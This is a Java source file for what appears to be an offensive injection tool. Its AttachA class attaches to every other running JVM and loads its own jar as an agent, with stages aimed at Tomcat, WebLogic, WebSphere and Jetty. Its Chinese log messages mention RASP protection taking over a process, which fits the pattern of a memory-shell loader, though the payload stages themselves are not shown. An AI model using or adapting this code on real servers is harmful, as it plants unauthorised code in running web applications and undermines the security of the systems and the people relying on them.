package indi.augusttheodor;

import com.sun.tools.attach.AgentInitializationException;
import com.sun.tools.attach.AgentLoadException;
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import indi.augusttheodor.stage.JettyStage;
import indi.augusttheodor.stage.Stage;
import indi.augusttheodor.stage.TomcatStage;
import indi.augusttheodor.stage.WebLogicStage;
import indi.augusttheodor.stage.WebSphereStage;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class AttachA {

    private static final List<Stage> STAGES = new ArrayList<>();
    static {
        STAGES.add(new TomcatStage());
        STAGES.add(new WebLogicStage());
        STAGES.add(new WebSphereStage());
        STAGES.add(new JettyStage());
    }

    public static List<Stage> getStages() {
        return STAGES;
    }

    public static void doAttach(String args) throws IOException, AgentLoadException, AgentInitializationException {
        String jarPath = AttachA.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        jarPath = new File(jarPath).getPath();
        List<VirtualMachineDescriptor> vList = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd : vList) {
            String vmdName = vmd.displayName();
            if (vmdName.contains(new File(jarPath).getName())) {
                continue;
            }
            System.out.println("-------->附加到" + vmdName);
            try {
                VirtualMachine attachV = VirtualMachine.attach(vmd);
                attachV.loadAgent(jarPath, args);
            } catch (AgentInitializationException e) {
                System.out.println(vmdName + " ---- agent 已附加但注入失败(" + e + ")，详见目标进程 stdout");
            } catch (AgentLoadException e) {
                System.out.println(vmdName + " ---- agent 加载失败(" + e + ")");
            } catch (Exception ea) {
                System.out.println(vmdName + " ---- 不支持 Attach(" + ea + ")！注意：这通常提示当前进程已被另一个 Agent 接管（可能是 RASP）");
            }
        }
    }
}
